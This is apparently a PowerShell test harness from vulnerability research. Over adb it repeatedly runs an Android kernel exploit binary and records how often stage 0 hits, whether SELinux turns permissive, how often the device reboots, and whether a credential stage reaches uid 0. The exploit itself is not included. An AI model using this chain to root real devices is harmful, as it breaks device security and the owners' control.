# Quantify the temporary-root chain: stage0 hit rate, stage1 success, reboots.
$ErrorActionPreference = "Continue"
$dev = "0484885189A00540"
$out = "E:\code\CVE\cve-2026-98260-xring\ab-logs\chain-stats.txt"

function Log($m) { $m | Tee-Object -FilePath $out -Append }
function Up   { [double]((adb -s $dev shell "cut -d' ' -f1 /proc/uptime") -join "") }
function Mode { ((adb -s $dev shell "getenforce") -join "").Trim() }

Remove-Item $out -ErrorAction SilentlyContinue
Log "=== chain stats $(Get-Date -Format HH:mm:ss) start mode=$(Mode)"

# ---- phase A: stage 0, one attempt per process ----
$aTries = 0; $aHits = 0; $reboots = 0
for ($i = 1; $i -le 15; $i++) {
    if ((Mode) -eq "Permissive") { break }
    $u0 = Up
    adb -s $dev shell "cd /data/local/tmp; timeout 30 ./pure2.bin 10000 8192 0 0 1 1 8000 200 > qa.log 2>&1" | Out-Null
    $u1 = Up
    $aTries++
    $hit = ((adb -s $dev shell "grep -a -c '^HIT' /data/local/tmp/qa.log 2>/dev/null") -join "").Trim()
    if ($hit -eq "1") { $aHits++ }
    $m = Mode
    $rb = ($u1 -lt $u0)
    if ($rb) { $reboots++ }
    Log "[A$i] hit=$hit mode=$m reboot=$rb"
    if ($m -eq "Permissive") { Log "[A$i] PERMISSIVE reached"; break }
    if ($rb) { Start-Sleep -Seconds 30 }
}
$m = Mode
Log "phaseA: tries=$aTries hits=$aHits reboots=$reboots mode=$m"

# ---- phase B: stage 1 (cred) ----
if ($m -eq "Permissive") {
    for ($j = 1; $j -le 3; $j++) {
        if ((Mode) -ne "Permissive") { Log "[B$j] permissive lost"; break }
        $u0 = Up
        adb -s $dev shell "cd /data/local/tmp; O3P_NOSEL=1 timeout 120 ./pure2.bin 10000 8192 0 0 4 1 8000 200 > qb.log 2>&1" | Out-Null
        $u1 = Up
        $uid = ((adb -s $dev shell "grep -a -oE 'UIDNOW uid=[0-9]+' /data/local/tmp/qb.log | tail -1") -join "").Trim()
        $rb  = ($u1 -lt $u0)
        Log "[B$j] $uid reboot=$rb"
        if ($uid -match "uid=0") { Log "[B$j] *** ROOT OK ***"; break }
        if ($rb) { Log "[B$j] kernel died"; break }
    }
}
Log "=== chain stats end $(Get-Date -Format HH:mm:ss) mode=$(Mode)"
